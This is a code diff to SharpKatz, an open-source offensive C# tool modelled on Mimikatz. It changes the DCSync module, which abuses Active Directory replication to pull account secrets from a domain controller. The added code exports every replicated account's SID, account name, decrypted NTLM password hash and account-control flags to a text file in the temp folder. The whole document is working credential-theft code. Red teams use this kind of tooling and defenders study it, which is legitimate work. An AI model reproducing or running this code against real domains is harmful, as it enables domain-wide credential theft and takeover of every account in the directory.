@@ -1,5 +1,17 @@
-﻿using System;
+﻿//
+// Author: B4rtik (@b4rtik)
+// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
+// License: BSD 3-Clause
+//
+
+/*
+ * Adapted by extending DCSync part of "MakeMeEnterpriseAdmin" 
+ * (https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1)
+ */
+
+using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Security.Principal;
@@ -192,6 +204,15 @@ namespace SharpKatz.Module
             DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY;
             IntPtr hDrs;
             DRS_EXTENSIONS_INT extensions;
+            string exportpath = string.Empty;
+
+            if (alldata)
+            {
+                exportpath = Path.GetTempPath() + DateTime.Now.Millisecond.ToString() + ".txt";
+                FileStream outputfile = File.Create(exportpath);
+                outputfile.Close();
+                Console.WriteLine("[*] Output file will be {0}", exportpath);
+            }
 
             kull_m_asn1_init();
 
@@ -204,17 +225,49 @@ namespace SharpKatz.Module
                     int result = DrsrGetDCBind(hBinding, mSG_GETCHGREQ.uuidDsaObjDest, DrsExtensionsInt, out extensions, out hDrs);
                     if (result == 0)
                     {
+                        DSNAME dsname = new DSNAME();
+                        dsname.Guid = UserGuid;
+                        IntPtr pdsName = AllocateMemory(Marshal.SizeOf(typeof(DSNAME)));
+                        Marshal.StructureToPtr(dsname, pdsName, true);
+                        mSG_GETCHGREQ.pNC = pdsName;
+                        mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
+                        mSG_GETCHGREQ.cMaxObjects = (uint)((alldata) ? 1000 : 1);
+                        mSG_GETCHGREQ.cMaxBytes = 0x00a00000; // 10M
+                        mSG_GETCHGREQ.ulExtendedOp = (uint)((alldata) ? 0 : 6);
+
+                        PARTIAL_ATTR_VECTOR_V1_EXT partAttSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
+                        mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
+                        partAttSet.dwVersion = 1;
+                        partAttSet.dwReserved1 = 0;
+
+                        if (alldata)
+                        {
+                            partAttSet.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids_export.Length;
+                            partAttSet.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+
+                            for (int i = 0; i < partAttSet.cAttrs; i++)
+                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], ref partAttSet.rgPartialAttr[i]);
+                        }
+                        else
+                        {
+                            partAttSet.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids.Length;
+                            partAttSet.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
+                            for (int i = 0; i < partAttSet.cAttrs; i++)
+                                DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], ref partAttSet.rgPartialAttr[i]);
+                        }
+
+                        mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
+                        Marshal.StructureToPtr(partAttSet, mSG_GETCHGREQ.pPartialAttrSet, false);
+
                         do
                         {
                             mSG_GETCHGREPLY = new DRS_MSG_GETCHGREPLY_V6();
-                            result = GetReplicatioData(hDrs, UserGuid, alldata, ref mSG_GETCHGREQ, ref mSG_GETCHGREPLY);
+
+                            result = GetReplicatioData(hDrs, alldata, ref mSG_GETCHGREQ, ref mSG_GETCHGREPLY);
                             if (result == 0)
                             {
-                                Dictionary<int, object> ReplicationData;
-                                MarshalReplicationData(mSG_GETCHGREPLY, out ReplicationData);
-
-                                PrintReplicationData(ReplicationData);
-
+                                MarshalReplicationData(mSG_GETCHGREPLY, alldata, exportpath);
+                                                                
                                 if (alldata)
                                 {
                                     mSG_GETCHGREQ.uuidInvocIdSrc = mSG_GETCHGREPLY.uuidInvocIdSrc;
@@ -237,47 +290,17 @@ namespace SharpKatz.Module
 
             kull_m_asn1_term();
 
+            if (alldata)
+            {
+                Console.WriteLine("[*] Replication data exported");
+            }
+
             return true;
         }
 
-        private static int GetReplicatioData(IntPtr hDrs, Guid targetGuid, bool alldata, ref DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ, ref DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY)
+        private static int GetReplicatioData(IntPtr hDrs, bool alldata, ref DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ, ref DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY)
         {
             uint dwOutVersion = 0;
-            DSNAME dsname = new DSNAME();
-            dsname.Guid = targetGuid;
-            IntPtr pdsName = AllocateMemory(Marshal.SizeOf(typeof(DSNAME)));
-            Marshal.StructureToPtr(dsname, pdsName, true);
-            mSG_GETCHGREQ.pNC = pdsName;
-            mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
-            mSG_GETCHGREQ.cMaxObjects = (uint)((alldata) ? 50 : 1);
-            mSG_GETCHGREQ.cMaxBytes = 0x00a00000; // 10M
-            mSG_GETCHGREQ.ulExtendedOp = (uint)((alldata) ? 0 : 6);
-
-
-
-            PARTIAL_ATTR_VECTOR_V1_EXT edr = new PARTIAL_ATTR_VECTOR_V1_EXT();
-            mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
-            edr.dwVersion = 1;
-            edr.dwReserved1 = 0;
-
-            if (alldata)
-            {
-                edr.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids_export.Length;
-                edr.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
-
-                for (int i = 0; i < edr.cAttrs; i++)
-                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], ref edr.rgPartialAttr[i]);
-            }
-            else
-            {
-                edr.cAttrs = (uint)kuhl_m_lsadump_dcsync_oids.Length;
-                edr.rgPartialAttr = new uint[kuhl_m_lsadump_dcsync_oids.Length];
-                for (int i = 0; i < edr.cAttrs; i++)
-                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], ref edr.rgPartialAttr[i]);
-            }
-
-            mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
-            Marshal.StructureToPtr(edr, mSG_GETCHGREQ.pPartialAttrSet, false);
 
             IntPtr result = NdrClientCall2_5(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);
 
@@ -817,16 +840,16 @@ namespace SharpKatz.Module
             return result;
         }
 
-        private static void MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut, out Dictionary<int, object> replicationData)
+        private static void MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut, bool alldata, string exportpath)
         {
             IntPtr pObjects = pmsgOut.pObjects;
             uint numObjects = pmsgOut.cNumObjects;
-            replicationData = new Dictionary<int, object>();
+            
             REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));
-            REPLENTINFLIST current = list;
 
-            do
+            while (numObjects > 0)
             {
+                Dictionary<int, object> replicationData = new Dictionary<int, object>();
                 int size = Marshal.SizeOf(typeof(ATTR));
                 for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                 {
@@ -851,7 +874,6 @@ namespace SharpKatz.Module
                                 //case ATT.ATT_TRUST_AUTH_OUTGOING:
                                 data = DecryptReplicationData(data);
                                 break;
-
                         }
 
                         values.Add(data);
@@ -866,12 +888,21 @@ namespace SharpKatz.Module
                     }
                 }
 
+                if (alldata)
+                {
+                    ExportReplicationData(replicationData, exportpath);
+                }
+                else
+                {
+                    PrintReplicationData(replicationData);
+                }
+
                 if (list.pNextEntInf != IntPtr.Zero)
                     list = (REPLENTINFLIST)Marshal.PtrToStructure(list.pNextEntInf, typeof(REPLENTINFLIST));
-                else
-                    break;
 
-            } while (true);
+                numObjects--;
+
+            } 
         }
 
 
@@ -1282,6 +1313,34 @@ namespace SharpKatz.Module
             }
         }
 
+        public static void ExportReplicationData(Dictionary<int, object> replicationData, string path)
+        {
+            Dictionary<string, object> dic;
+            DecodeReplicationFields(replicationData, out dic);
+
+            dic.TryGetValue("ATT_USER_ACCOUNT_CONTROL", out object uac);
+            dic.TryGetValue("ATT_UNICODE_PWD", out object unicodePwd);
+            dic.TryGetValue("ATT_OBJECT_SID", out object objectSid);
+            dic.TryGetValue("ATT_SAM_ACCOUNT_NAME", out object samAccountName);
+
+            if (!File.Exists(path))
+                return;
+
+            StreamWriter sw = File.AppendText(path);
+
+            if (objectSid != null || samAccountName != null || unicodePwd != null || uac != null)
+            {
+                string outstring = string.Format("{0}\t", objectSid);
+                outstring += string.Format("{0}\t", samAccountName);
+                outstring += string.Format("{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
+                outstring += string.Format("{0}", UacToString(Convert.ToInt32(uac)));
+
+                sw.WriteLine(outstring);
+            }
+
+            sw.Close();
+        }
+
         private static void KeyDataInfo(byte[] data, int start, int count)
         {
             for (int k = 0; k < count; k++)
@@ -1429,7 +1488,6 @@ namespace SharpKatz.Module
 
         private static string SamAccountTypeToString(uint accountType)
         {
-
             SamAccountType sat = (SamAccountType)accountType;
             return sat.ToString();
         }
@@ -1437,7 +1495,7 @@ namespace SharpKatz.Module
         private static string UacToString(int uac)
         {
             UserAccountControl userAccountControl = (UserAccountControl)uac;
-            return userAccountControl.ToString(); ;
+            return userAccountControl.ToString();
         }
     }
 }
